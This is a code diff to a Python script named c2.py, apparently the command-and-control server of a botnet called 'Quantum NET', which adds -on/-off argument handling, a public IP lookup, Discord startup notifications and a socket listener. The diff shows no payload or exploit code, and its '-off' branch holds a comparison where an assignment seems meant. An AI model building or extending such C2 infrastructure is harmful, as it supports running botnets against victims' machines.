@@ -7,15 +7,7 @@
 #
 
 # Modules
-import socket
-import sys
-import os
-import requests
-import time
-import threading
-import requests
-import random
-import datetime
+import socket, sys, os, requests, time, threading, requests, random, datetime
 
 # Files
 from assets.Config.main import *
@@ -53,8 +45,14 @@ host = "0.0.0.0"
 timenow = datetime.datetime.now()
 port = random.randint(0, 65535)
 if len(sys.argv) == 2:
-    if sys.argv[1] == "-on":
-        host = requests.get("https://api.ipify.org").text
+        if sys.argv[1] == "-on":
+                host = requests.get("https://api.ipify.org").text
+                Discord.send_status(f"Quantum NET successfully started!\n\nHost: {host} | Port {port}\r\nTime: {utils.CurrentTime()}")
+        elif sys.argv[1] == "-off":
+                host == "0.0.0.0"
+                Discord.send_status(f"Quantum NET successfully started but seem like a Quantum Dev is just testing on localhost!\n\nHost: {host} | Port {port}\r\nTime: {utils.CurrentTime()}")
+else:
+        print(f"[x] Error, Invalid Argument\r\nUsage: python3 c2.py <-on/-off>")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Try To Reuse Port Bypass TIME_WAIT Sometimes
@@ -63,7 +61,6 @@ sock.bind((host, port))
 sock.listen()
 
 print(f"[{datetime.datetime.now()}] | Quantum Started | {host} | {port} |") # Added Date And Time So You Can See When Was The Last Time The Net Started !
-Discord.send_status(f"Quantum NET successfully started!\n\nHost: {host} | Port {port}\r\nTime: {utils.CurrentTime()}")
 
 def handle_connection(client, addr):
         Current.CurrentInfo['IP'] = addr[0]
